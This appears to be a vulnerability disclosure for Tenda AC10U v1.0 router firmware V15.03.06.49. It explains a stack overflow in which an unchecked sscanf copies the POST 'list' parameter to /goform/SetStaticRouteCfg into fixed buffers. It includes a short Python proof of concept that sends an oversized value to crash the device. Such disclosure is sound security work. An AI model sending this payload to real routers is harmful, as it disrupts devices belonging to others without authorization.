## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3795.html

## Affected version

AC10U v1.0 Firmware V15.03.06.49

## Vulnerability details

The Tenda AC10U v1.0 Firmware V15.03.06.49 firmware has a stack overflow vulnerability in the `fromSetRouteStatic` function. The `list` variable receives the `list` parameter from a POST request and is later assigned to function `save_staticroute_data`. 

![image-20240313145650112](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313145650112.png)

In the `save_staticroute_data` function, the `buf` (the value of `list`) is passed to `p` and formatted by the `sscanf` function and in the form of `%[^,],%[^,],%[^,],%s`. This greedy matching mechanism is not secure, as long as the size of the data we enter is larger than the size of `dst_net, net_mask, net_gw, net_ifname`, it will cause a stack overflow.

![image-20240313145839536](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313145839536.png)

![image-20240313145915967](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313145915967.png)

![image-20240313145933991](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313145933991.png)

The user-provided `list` can trigger this security vulnerability.

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetStaticRouteCfg"
payload = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,a,a,aa"

data = {"list": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240313150035383](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313150035383.png)